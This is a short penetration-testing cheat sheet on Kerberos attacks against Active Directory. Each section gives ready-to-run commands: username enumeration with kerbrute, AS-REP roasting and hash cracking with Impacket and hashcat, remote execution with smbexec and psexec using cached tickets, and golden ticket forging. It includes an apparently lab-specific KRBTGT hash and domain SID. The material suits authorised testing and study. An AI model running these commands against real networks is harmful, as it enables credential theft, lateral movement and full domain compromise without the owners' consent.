Kerberos

Kerbrute​

  • kerbrute

How It Works​

When you send a Authentication Service Request (AS-REQ) for a TGT without a pre-auth hash, the KDC responds differently depending on whether the account exists:

  • If does not exist, the KDC returns KDC_ERR_C_PRINCIPAL_UNKNOWN.
  • If does exist, the KDC requests pre-authentication.

Kerbrute does not trigger account lockouts, but generates noise through Windows Event ID 4768.

Execution​

# execute
kerbrute userenum -d <DOMAIN> --dc <DC_IP> /<PATH_TO_USERS> -o output.txt

# filter output
grep "VALID USERNAME" valid_users.txt | awk '{print $NF}' | sed 's/@<DOMAIN>//' > clean_users.txt

AS-REP Roasting​

Win - Rubeus
Win/Lin - Impacket - GetNPUsers.py

How it works​

If pre-auth is disabled, KDC returns an encrypted AS-REP blob without confirmation of user's identity. Can be captured and cracked offline to recover user's pass.

Search for UF_DONT_REQUIRE_PREAUTH flag.

Execution​

# dump it
impacket-GetNPUsers 221b.local/ -dc-ip <dc_ip> -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass

# crack it
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt

Linux CCACHE​

# request TGT, create ccache file
impacket-getTGT <domain>/<user>:'<password>' -dc-ip <dc_ip>

# set env variable
export KRB5CCNAME=<ccache_file>

# check with nxc
nxc smb <ip> -u <user> -k --user-kcache -d <domain>

# smbexec
impacket-smbexec -k -no-pass <domain>/<user>@<dc_ip>

# psexec
impacket-psexec <domain>/<user>:'<password>'@<dc_ip>

Golden Ticket​

If you're able to get the KRBTGT pass hash.

  • KRBTGT Hash: e9a9871b93d7b4d73c91665bd6df6e50
  • Domain SID: S-1-5-21-990021728-513958382-3715561918
# forge
impacket-ticketer -nthash <hash> -domain-sid <domain_sid> -domain <domain> <user>

# set ccache
export KRB5CCNAME=<ccache_file>

# connect
smbclient.py <domain>/<user>@<server_name>.<domain> -k -no-pass -dc-ip <dc_ip>
